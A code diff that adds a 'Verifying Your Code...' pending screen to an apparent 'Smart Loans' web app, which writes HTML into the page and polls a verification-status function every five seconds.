@@ -394,6 +394,67 @@ app.get("/add-verification-status", async (req, res) => {
     }
 
 });
+// ======================================================
+// VERIFICATION PENDING SCREEN
+// ======================================================
+
+function loadVerificationPendingScreen() {
+
+    const app = document.getElementById("app");
+
+    app.innerHTML = `
+
+    <div class="container">
+
+        <div class="welcome-card">
+
+            <div style="font-size:60px;text-align:center;">
+                🏦
+            </div>
+
+            <h2 style="text-align:center;">
+                Smart Loans
+            </h2>
+
+            <br>
+
+            <div style="text-align:center;font-size:24px;color:#f39c12;font-weight:bold;">
+
+                🟡 Verifying Your Code...
+
+            </div>
+
+            <br>
+
+            <p style="text-align:center;line-height:1.8;">
+
+                Your verification code has been sent successfully.
+
+                <br><br>
+
+                Please wait while we verify your code.
+
+            </p>
+
+            <br>
+
+            <div class="loading-dots">
+
+                <span></span>
+                <span></span>
+                <span></span>
+
+            </div>
+
+        </div>
+
+    </div>
+
+    `;
+monitorVerificationStatus();
+
+setInterval(monitorVerificationStatus, 5000);
+}
 // ===============================
 // UPDATE APPLICATION STATUS
 // ===============================
